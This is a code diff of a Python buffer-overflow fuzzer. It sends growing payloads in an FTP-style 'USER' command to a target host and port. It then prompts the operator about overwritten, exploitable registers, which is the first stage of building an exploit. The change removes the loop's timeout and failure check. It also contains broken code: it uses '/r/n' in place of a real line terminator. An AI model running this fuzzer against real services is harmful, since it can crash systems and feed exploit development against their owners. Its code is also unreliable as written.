@@ -58,20 +58,21 @@ def get_elapsed_time(_start_time, verbosity):
     return seconds
 
 
-def send_var(_var, _ip, _port):
+def send_var(_var, _ip, _port):                                     # Rewrite here for specific target
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10.0)                                          # Timeout in seconds (S)
         s.connect((_ip, _port))
         s.recv(1024)
-        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto
-        s.recv(1024)
-        passwd = f'PASS {_var}\r\n'
-        s.send(b'passwd')                                  # <REFACTOR> for different syntax/proto
-        s.recv(1024)
-        print(type(passwd), len(passwd), 'password shit')
-        #s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto
+        s.send(bytes("USER " + _var + "/r/n", encoding='utf8'))
+        #s.recv(1024)
+        #passwd = f'PASS {_var}\r\n'
+        #s.send(b'passwd')
+        #s.recv(1024)
+        #print(type(passwd), len(passwd), 'password shit')
+        #s.send(b'QUIT\r\n')
         s.close()
+        time.sleep(1.5)
         result = 'pass'
     except socket.timeout:
         print(f'[-] Connection Timed Out!')
@@ -248,17 +249,13 @@ def fuzz_test(_ip, _port, _char_length):
         ascii_len = ascii_len + 100
     current_buffer = ''
     start_time = time.time()
-
     for buffer in buffers:
         current_buffer = buffer
         msg = f'[+] {_ip}:{_port} <== {len(buffer)} bytes. Take note the byte length if there is unusual delay.\n'
         print(msg)
         tcp_result = send_var(buffer, _ip, _port)
-        time.sleep(1)
         elapsed_time = get_elapsed_time(start_time, 'quiet')
-        if tcp_result == 'fail' or elapsed_time/len(buffers) > 5.0:
-            print('[x] The target failed to respond in enough time. Exiting.\n')
-            break
+
     msg = f'[+] Potential failure at byte length: {len(current_buffer)} bytes. Investigate target registers noting ' \
           f'any potentially overwritten.\n\tDid you identify an overflow and exploitable register? (Y/N) {exit_option}'
     try:
